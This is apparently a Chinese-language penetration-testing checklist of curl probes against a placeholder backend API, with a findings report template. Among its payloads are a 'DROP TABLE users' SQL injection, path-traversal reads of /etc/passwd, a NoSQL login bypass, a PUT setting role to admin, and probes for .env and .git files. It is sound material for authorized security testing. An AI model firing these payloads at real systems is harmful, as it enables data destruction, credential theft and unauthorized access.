# 后端 API 探测清单

每个目标站点必跑的 8 类探测。

## 1. 探活与指纹
```bash
curl -I -L --max-time 10 https://target/
curl -s -L --max-time 10 https://target/ | head -c 500
curl -I -L --max-time 10 https://target/api/
```

**关注：**
- HTTP 状态码
- 响应头（Server, X-Powered-By, X-Frame-Options, CORS）
- HTML 顶部技术栈线索

## 2. 鉴权缺失测试
```bash
# 不带任何认证头
curl -s -L --max-time 10 https://target/api/v1/users
curl -s -L --max-time 10 https://target/api/v1/orders
```

**关注：**
- 是否返回 401/403
- 还是返回 200 + 空数据
- 还是返回 200 + 完整数据（**严重！**）

## 3. 无效鉴权测试
```bash
curl -s -L -H "Authorization: Bearer invalid_token_12345" https://target/api/v1/users
```

**关注：**
- 错误消息是否泄露鉴权方案
- 是否给不同的错误信息（账户存在 vs 不存在 → 用户枚举漏洞）

## 4. XSS / 注入试探
```bash
# URL query
curl -s -L 'https://target/api/v1/search?q=<script>alert(1)</script>'

# POST body
curl -s -L -X POST https://target/api/v1/comments \
  -H "Content-Type: application/json" \
  -d '{"text":"<script>alert(1)</script>"}'

# 路径
curl -s -L 'https://target/api/v1/users/<script>'
```

**关注：**
- 响应是否原样反射（反射型 XSS）
- 是否做了 HTML 编码
- 是否有 CSP 头

## 5. SQL/NoSQL 注入试探
```bash
# 经典 SQL
curl -s -L "https://target/api/v1/user?id=1' OR '1'='1"
curl -s -L "https://target/api/v1/user?id=1; DROP TABLE users;--"

# NoSQL
curl -s -L -X POST https://target/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"user":{"$gt":""},"pass":{"$gt":""}}'
```

**关注：**
- 错误消息是否暴露 SQL
- 500 错误 vs 401 错误
- 时间差异（盲注线索）

## 6. 路径穿越
```bash
curl -s -L 'https://target/api/v1/../v1/admin'
curl -s -L 'https://target/api/v1/../../etc/passwd'
curl -s -L 'https://target/api/..%2F..%2Fetc%2Fpasswd'
curl -s -L 'https://target/..%00/etc/passwd'
```

**关注：**
- 是否能跳出 /api 目录
- 是否能读取系统文件

## 7. HTTP 方法探测
```bash
# OPTIONS - 看允许的方法和 CORS
curl -s -L -X OPTIONS https://target/api/v1/resource \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: DELETE" -i

# DELETE - 不存在的资源
curl -s -L -X DELETE https://target/api/v1/users/99999

# PUT - 看是否覆盖
curl -s -L -X PUT https://target/api/v1/users/1 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**关注：**
- OPTIONS 响应是否允许危险方法
- CORS 是否配置错误（`Access-Control-Allow-Origin: *` + 鉴权 = 灾难）
- 未鉴权用户能否修改数据

## 8. 错误处理与信息泄露
```bash
# 故意触发错误
curl -s -L 'https://target/api/v1/resource?limit=-1'
curl -s -L -X POST https://target/api/v1/resource -d '{invalid json'
curl -s -L 'https://target/api/v1/resource?page=abc'

# 触发 500 看错误页
curl -s -L 'https://target/api/v1/resource?trigger=error'
```

**关注：**
- 错误消息是否暴露文件路径、版本号、SQL 语句
- 是否有堆栈跟踪泄露
- 错误码是否一致（404 vs 200 + "not found"）

## 9. 速率限制
```bash
for i in {1..100}; do
  curl -s -o /dev/null -w "%{http_code}\n" https://target/api/v1/resource
done | sort | uniq -c
```

**关注：**
- 是否有 429 限流
- 限流后错误消息是否泄露配置
- 未限流 = 暴力破解/爬虫可趁之机

## 10. 已知信息泄露
```bash
# 备份文件
curl -I https://target/.env
curl -I https://target/.git/HEAD
curl -I https://target/backup.sql
curl -I https://target/Dockerfile

# 内部端点
curl -s -L https://target/api/internal
curl -s -L https://target/api/admin
curl -s -L https://target/_debug
curl -s -L https://target/graphql
```

**关注：**
- 是否暴露环境变量
- 是否暴露 Git 历史
- 是否暴露内部 API

## 报告模板（每条 API 探测结果）

```markdown
### API: <METHOD> <URL>

| 探测项 | 结果 | 严重性 |
|---|---|---|
| 探活 | 200 OK | - |
| 无鉴权 | 200 + 完整数据 | 🔴 Critical |
| 无效鉴权 | 200 + 同数据 | 🟠 High（用户枚举风险）|
| XSS 试探 | 原样反射 | 🔴 Critical |
| SQL 注入 | 500 错误 | 🟠 High（注入成功）|
| 路径穿越 | 200 | 🟡 Medium |
| 错误消息 | 暴露 SQL 语句 | 🔴 Critical |
```

## 总结建议

跑完所有探测后，**至少回答 4 个问题：**

1. **未鉴权能访问到什么？** → Critical
2. **错误消息泄露了什么？** → 严重性看内容
3. **有没有限流？** → 缺失 = High
4. **有没有 CSP / X-Frame-Options / X-Content-Type-Options？** → 缺失 = Medium
